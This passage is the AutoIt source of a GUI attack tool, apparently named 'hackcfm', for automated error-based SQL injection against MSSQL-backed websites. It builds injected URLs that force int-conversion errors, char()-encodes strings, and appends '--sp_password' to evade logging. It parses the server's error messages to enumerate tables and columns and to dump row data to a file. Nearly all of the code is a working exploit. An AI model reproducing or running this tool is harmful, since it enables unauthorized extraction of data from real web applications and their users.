	If Get_Error_Content($HTMLSource) Then
		$strReceive = StringSplit(Get_Error_Content($HTMLSource),"/")
		GUICtrlSetData($servername,$strReceive[1])
		GUICtrlSetData($systemuser,$strReceive[2])
		GUICtrlSetData($dbname,$strReceive[3])
	Else
		MsgBox(0,"Result", "Fail!")
	EndIf
EndFunc
Func BuildQuery()
	$compare = compare()
	$lquery = ""
	If $compare = ">" Then
		$lquery = " order by " & GUICtrlRead($Orderby) & " asc))"
	ElseIf $compare = "<" Then
		$lquery = " order by " & GUICtrlRead($Orderby) & " desc))"
	Else
		$lquery = "))"
	EndIf
	$query = " 1=convert(int,(select top 1 convert(varchar,isnull(convert(varchar," & StringReplace(GUICtrlRead($Columns), GUICtrlRead($Delimiters), "),char(32)))%2bchar(47)%2bconvert(varchar,isnull(convert(varchar,") & "),char(32))) from " & GUICtrlRead($Tables)
	$sURL = GUICtrlRead($URL) & " " & andor() & $query & $lquery & hnend()
	GUICtrlSetData($ShowQuery, $sURL)
EndFunc
Func Gettables()
	GUICtrlSetData($Tableslst,"")
	$URLInput = GUICtrlRead($URL)
	$compare = compare()
	$sort = ""
	If $compare = "<" Then
		$sort = "desc"
	Else
		$sort = "asc"
	EndIf
	$query1 = " 1=convert(int,(select top 1 table_name from information_schema.tables order by table_name " & $sort & "))"
	$query2 = " 1=convert(int,(select top 1 table_name from information_schema.tables where table_name" & $compare
	$sURL = $URLInput & " " & andor() & $query1 & hnend()
	$strReceive = Get_Error_Content(GetHTML($sURL))
	GUICtrlSetData($Tableslst,$strReceive)
	If $compare = "<>" Then
		$strInsert = $strReceive
		While ($strReceive <> "") And ($strInsert <> "") And (GUIGetMsg() <> $GUI_EVENT_CLOSE)
			$sURL = $URLInput & " " & andor() & $query2 & splitstr($strReceive, "table_name") & "))" & hnend()
			$strInsert = Get_Error_Content(GetHTML($sURL))
			$strReceive = $strReceive & "/^*^/" & $strInsert
			If $strInsert <> "" Then
				GUICtrlSetData($Tableslst,$strInsert)
			EndIf
		WEnd
	Else
		While ($strReceive <> "") And (GUIGetMsg() <> $GUI_EVENT_CLOSE)
			$sURL = $URLInput & " " & andor() & $query2 & convertstr($strReceive) & " order by table_name " & $sort & "))" & hnend()
			$strReceive = Get_Error_Content(GetHTML($sURL))
			If $strReceive <> "" Then
				GUICtrlSetData($Tableslst,$strReceive)
			Else
				MsgBox(0,"Result", "All tables have been gotten")
			EndIf
		WEnd
	EndIf
EndFunc
Func GetColumns()
	GUICtrlSetData($Columnslst,"")
	$URLInput = GUICtrlRead($URL)
	$compare = compare()
	$sort = ""
	If $compare = "<" Then
		$sort = "desc"
	Else
		$sort = "asc"
	EndIf
	$query1 = " 1=convert(int,(select top 1 column_name from information_schema.columns where table_name=" & convertstr(GUICtrlRead($Tableslst)) & " order by column_name " & $sort & "))"
	$query2 = " 1=convert(int,(select top 1 column_name from information_schema.columns where table_name=" & convertstr(GUICtrlRead($Tableslst)) & " and column_name" & $compare
	$sURL = $URLInput & " " & andor() & $query1 & hnend()
	$strReceive = Get_Error_Content(GetHTML($sURL))
	GUICtrlSetData($Columnslst,$strReceive)
	If $compare = "<>" Then
		$strInsert = $strReceive
		While ($strReceive <> "") And ($strInsert <> "") And (GUIGetMsg() <> $GUI_EVENT_CLOSE)
			$sURL = $URLInput & " " & andor() & $query2 & splitstr($strReceive, "column_name") & "))" & hnend()
			$strInsert = Get_Error_Content(GetHTML($sURL))
			$strReceive = $strReceive & "/^*^/" & $strInsert
			If $strInsert <> "" Then
				GUICtrlSetData($Columnslst,$strInsert)
			EndIf
		WEnd
	Else
		While ($strReceive <> "") And (GUIGetMsg() <> $GUI_EVENT_CLOSE)
			$sURL = $URLInput & " " & andor() & $query2 & convertstr($strReceive) & " order by column_name " & $sort & "))" & hnend()
			$strReceive = Get_Error_Content(GetHTML($sURL))
			If $strReceive <> "" Then
				GUICtrlSetData($Columnslst,$strReceive)
			Else
				MsgBox(0,"Result", "All columns have been gotten")
			EndIf
		WEnd
	EndIf
EndFunc
Func Save($ControlID, $fileinput)
	$count = _GUICtrlListCount($ControlID)
	If ($count == $LB_ERR) Then
		MsgBox(0,"Alert!", "Error!!!")
	Else
		For $i = 0 To $count - 1
			$fopen = FileOpen($fileinput, 1)
			FileWrite($fopen, _GUICtrlListGetText($ControlID, $i) & @CRLF)
			FileClose($fopen)
		Next
	EndIf
EndFunc
Func Load($ControlID, $fileinput)
	Local $aArray
	If (Not FileReadToArray($fileinput, $aArray)) Then
		MsgBox(0, "Alert!", "Can not read file")
	Else
		For $i = 1 To $aArray[0]
			If $aArray[$i] <> "" Then
				GUICtrlSetData($ControlID, $aArray[$i])
			EndIf
		Next
	EndIf
EndFunc
Func BuildSQL()
	$ret = _GUICtrlListGetSelItemsText($Columnslst)
	$keyuse = GUICtrlRead($Key)
	$num = GUICtrlRead($Numinput)
	$sURL = ""
	If GUICtrlRead($Tableslst) = "" Then
		MsgBox(0, "Alert!", "Chua chon Table")
	ElseIf (Not IsArray($ret))  Then
		MsgBox(0, "Alert!", "Chua chon Column")
	ElseIf $keyuse = "" Then
		MsgBox(0, "Alert!", "Chua chon Key")
	Else
		$compare = compare()
		$lquery = ""
		If BitAND(GUICtrlRead($Numcb), $GUI_CHECKED) Then
			If $compare = ">" Then
				$lquery = " where " & $keyuse & $compare & "$/^*^/$" & " order by " & $keyuse & " asc))"
			ElseIf $compare = "<" Then
				$lquery = " where " & $keyuse & $compare & "$/^*^/$" & " order by " & $keyuse & " desc))"
			Else
				$lquery = " where " & $keyuse & $compare & "$/^*^/$" & "))"
			EndIf
		Else
			If $compare = ">" Then
				$lquery = " order by " & $keyuse & " asc))"
			ElseIf $compare = "<" Then
				$lquery = " order by " & $keyuse & " desc))"
			Else
				$lquery = "))"
			EndIf
		EndIf
		$mid = ""
		If (IsArray($ret)) Then
			For $i = 1 To $ret[0] - 1
				$mid = $mid & $ret[$i] & "),char(32)))%2bchar(47)%2bconvert(varchar,isnull(convert(varchar,"
			Next
		EndIf
		$mid = $mid & $ret[$ret[0]]
		$query = " 1=convert(int,(select top 1 convert(varchar,isnull(convert(varchar," & $mid & "),char(32))) from " & GUICtrlRead($Tableslst)
		$sURL = GUICtrlRead($URL) & " " & andor() & $query & $lquery & hnend()
	EndIf
	Return $sURL
EndFunc
Func AutoGet($condition)
	If BuildSQL() <> "" Then
		If (BitAND(GUICtrlRead($Numcb), $GUI_CHECKED)) Then
			$sURL = StringReplace(BuildSQL(), "$/^*^/$", convertstr(GUICtrlRead($Numinput)))
			$count = 0
			$compare = compare()
			$fileinput = GUICtrlRead($path)
			GUICtrlSetData($ShowData, "")
			$strReceive = Get_Error_Content(GetHTML($sURL))
			If $condition = "Show" Then
				GUICtrlSetData($ShowData, $strReceive & @CRLF)
			ElseIf $condition = "Save" Then
				$fopen = FileOpen($fileinput, 1)
				FileWrite($fopen, $strReceive & @CRLF)
				FileClose($fopen)
			EndIf
			$Pos = StringInStr($sURL, GUICtrlRead($Key))
			$substring = StringMid($sURL, 1, $Pos)
			$Pos = StringInStr($substring, "convert(varchar,isnull(convert(varchar,")
			While $Pos <> 0
				$count += 1
				$Pos = StringInStr($substring, "convert(varchar,isnull(convert(varchar,", 0, $count + 1)
			WEnd
			If $compare = "<>" Then
				$strInsert = ""
				While ($strReceive <> "") And (GUIGetMsg() <> $stop)
					$NumRC = StringSplit($strReceive, "/")
					$strInsert = $strInsert & "/^*^/??" & $NumRC[$count]
					$sURL = StringReplace(BuildSQL(), "$/^*^/$", splitstr($strInsert, GUICtrlRead($Key)))
					$strReceive = Get_Error_Content(GetHTML($sURL))
					If $condition = "Show" Then
						GUICtrlSetData($ShowData, GUICtrlRead($ShowData) & $strReceive & @CRLF)
					ElseIf $condition = "Save" Then
						$fopen = FileOpen($fileinput, 1)
						FileWrite($fopen, $strReceive & @CRLF)
						FileClose($fopen)
					EndIf
				WEnd
			Else
				While ($strReceive <> "") And (GUIGetMsg() <> $stop)
					$NumRC = StringSplit($strReceive, "/")
					$sURL = StringReplace(BuildSQL(), "$/^*^/$", convertstr($NumRC[$count]))
					$strReceive = Get_Error_Content(GetHTML($sURL))
					If $condition = "Show" Then
						GUICtrlSetData($ShowData, GUICtrlRead($ShowData) & $strReceive & @CRLF)
					ElseIf $condition = "Save" Then
						$fopen = FileOpen($fileinput, 1)
						FileWrite($fopen, $strReceive & @CRLF)
						FileClose($fopen)
					EndIf
				WEnd
			EndIf
			MsgBox(0, "", "All Done")
		Else
			MsgBox(0, "Alert!", "Phai chon num checkbox")
		EndIf
	EndIf
EndFunc
Func ManualGet()
	$sURL = GUICtrlRead($ShowSQL)
	If StringInStr($sURL, "http://") = 0 Then
		MsgBox(0, "", "Du lieu trong Show SQL khong hop le")
	Else
		GUICtrlSetData($ShowData, GUICtrlRead($ShowData) & Get_Error_Content(GetHTML($sURL)) & @CRLF)
		MsgBox(0, "", "Done")
	EndIf
EndFunc
Func Up()
	$count = _GUICtrlListCount($Columnslst)
	If ($count == $LB_ERR) Then
		MsgBox(0,"Alert!", "Error!!!")
	Else
		$ret = _GUICtrlListGetSelItems($Columnslst)
		If Not(IsArray($ret)) Then
			MsgBox(0, "Alert!", "Chua chon Column")
		ElseIf $ret[1] = 0 Then
			MsgBox(0, "Alert!", "Ko the di chuyen")
		Else
			Local $A[$maxvalue]
			$B = ""
			For $i = 0 To $count - 1
				$A[$i] = _GUICtrlListGetText($Columnslst, $i)
			Next
			For $i = 1 To $ret[0]
				$B = $A[$ret[$i] - 1]
				$A[$ret[$i] - 1] = $A[$ret[$i]]
				$A[$ret[$i]] = $B
			Next
			GUICtrlSetData($Columnslst, "")
			For $i = 0 To $count - 1
				GUICtrlSetData($Columnslst, $A[$i])
			Next
			For $i = 1 To $ret[0]
 			_GUICtrlListSetSel($Columnslst, 1, $ret[$i] - 1)
			Next
		EndIf
	EndIf
EndFunc
Func Down()
	$count = _GUICtrlListCount($Columnslst)
	If ($count == $LB_ERR) Then
		MsgBox(0,"Alert!", "Error!!!")
	Else
		$ret = _GUICtrlListGetSelItems($Columnslst)
		If Not(IsArray($ret)) Then
			MsgBox(0, "Alert!", "Chua chon Column")
		ElseIf $ret[$ret[0]] = ($count - 1) Then
			MsgBox(0, "Alert!", "Ko the di chuyen")
		Else
			Local $A[$maxvalue]
			$B = ""
			For $i = 0 To $count - 1
				$A[$i] = _GUICtrlListGetText($Columnslst, $i)
			Next
			For $i = $ret[0] To 1 Step -1
				$B = $A[$ret[$i] + 1]
				$A[$ret[$i] + 1] = $A[$ret[$i]]
				$A[$ret[$i]] = $B
			Next
			GUICtrlSetData($Columnslst, "")
			For $i = 0 To $count - 1
				GUICtrlSetData($Columnslst, $A[$i])
			Next
			For $i = 1 To $ret[0]
 			_GUICtrlListSetSel($Columnslst, 1, $ret[$i] + 1)
			Next
		EndIf
	EndIf
EndFunc
Func transfer()
	GUICtrlSetData($Key,"")
	$ret = _GUICtrlListGetSelItemsText($Columnslst)
	If (IsArray($ret)) Then
		For $i = 1 To $ret[0]
			GUICtrlSetData($Key, $ret[$i], $ret[1])
		Next
	EndIf
EndFunc
Func Get_Error_Content($strContent)
		Const $a = "converting the varchar value '"
		Const $a1 = "converting the nvarchar value '"
		Const $a2 = "converting the varchar value &apos;"
		Const $a3 = "converting the nvarchar value &apos;"
		Const $a4 = "conversion of the varchar value '"
		Const $a5 = "conversion of the nvarchar value '"
		Const $b = "' to a column of data type int."
		Const $b1 = "&apos; to a column of data type int."
		Const $b2 = "' to data type int."
		Const $b3 = "&apos; to data type int."
		Const $b4 = "' overflowed an int column. Maximum integer value exceeded."
		$Content = ""
		$len = StringLen($strContent)
		$i = StringInStr($strContent,$a)
		If $i = 0 Then
			$i = StringInStr($strContent,$a1)
			If $i = 0 Then
				$i = StringInStr($strContent,$a2)
				If $i = 0 Then
					$i = StringInStr($strContent,$a3)
					If $i = 0 Then
						$i = StringInStr($strContent,$a4)
						If $i = 0 Then
							$i = StringInStr($strContent,$a5)
							If $i = 0 Then
								Return $Content
							Else
								$i = $i + StringLen($a5)
							EndIf
						Else
							$i = $i + StringLen($a4)
						EndIf
					Else
						$i = $i + StringLen($a3)
					EndIf
				Else
					$i = $i + StringLen($a2)
				EndIf
			Else
				$i = $i + StringLen($a1)
			EndIf
		Else
			$i = $i + StringLen($a)
		EndIf
		$j = StringInStr($strContent,$b)
		If $j = 0 Then
			$j = StringInStr($strContent,$b1)
			If $j = 0 Then
				$j = StringInStr($strContent,$b2)
				If $j = 0 Then
					$j = StringInStr($strContent,$b3)
					If $j = 0 Then
						$j = StringInStr($strContent,$b4)
						If $j = 0 Then
							Return $Content
						Else
							$j = $j
						EndIf
					Else
						$j = $j
					EndIf
				Else
					$j = $j
				EndIf
			Else
				$j = $j
			EndIf
		Else
			$j = $j
		EndIf
		$Content = StringMid($strContent,$i, $j - $i)
		Return $Content
EndFunc
Func convertstr($strInput)
	$strOutput = ""
	$i = 1
	While $i < StringLen($strInput) + 1
		$strOutput = $strOutput & "char(" & Asc(StringMid($strInput, $i, 1)) & ")%2b"
		$i = $i + 1
	WEnd
	$strOutput = StringMid($strOutput,1,StringLen($strOutput) - 3)
	return $strOutput
EndFunc
Func splitstr($strInput, $name)
	$strOutput = ""
	$field = StringSplit($strInput, "/^*^/", 1)
	$i = 1
	While $i < $field[0]
		$strOutput = $strOutput & convertstr($field[$i]) & " and " & $name & "<>"
		$i = $i + 1
	WEnd
	$strOutput = $strOutput & convertstr($field[$field[0]])
	return $strOutput
EndFunc
Func andor()
	$value = ""
	If BitAND(GUICtrlRead($andrd), $GUI_CHECKED) Then
		$value = "and"
	EndIf
	If BitAND(GUICtrlRead($orrd), $GUI_CHECKED) Then
		$value = "or"
	EndIf
	return $value
EndFunc
Func hnend()
	$value = ""
	If BitAND(GUICtrlRead($hendrd), $GUI_CHECKED) Then
		$value = "--sp_password"
	EndIf
	If BitAND(GUICtrlRead($nendrd), $GUI_CHECKED) Then
		$value = ""
	EndIf
	return $value
EndFunc
Func compare()
	$value = ""
	If BitAND(GUICtrlRead($thanrd), $GUI_CHECKED) Then
		$value = ">"
	EndIf
	If BitAND(GUICtrlRead($lessrd), $GUI_CHECKED) Then
		$value = "<"
	EndIf
	If BitAND(GUICtrlRead($otherrd), $GUI_CHECKED) Then
		$value = "<>"
	EndIf
	return $value
EndFunc
Func GetHTML($URLInput)
	$oHTTP = ObjCreate("winhttp.winhttprequest.5.1")
	$oHTTP.Open("GET", $URLInput)
	$oHTTP.Send()
	$HTMLSource = $oHTTP.Responsetext
	return $HTMLSource
EndFunc
Func CLOSEClicked()
	Exit
EndFunc
Func FileReadToArray($sFilePath, ByRef $aArray)
	Local $hFile
	$hFile = FileOpen($sFilePath, 0)
	If $hFile = -1 Then
		SetError(1)
		Return 0
	EndIf
	$aArray = StringSplit(StringStripCR(FileRead($hFile, FileGetSize($sFilePath))), @LF)
	FileClose($hFile)
	Return 1
EndFunc
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: K:\longnhi\tool\project\hackcfm.au3>
; ----------------------------------------------------------------------------

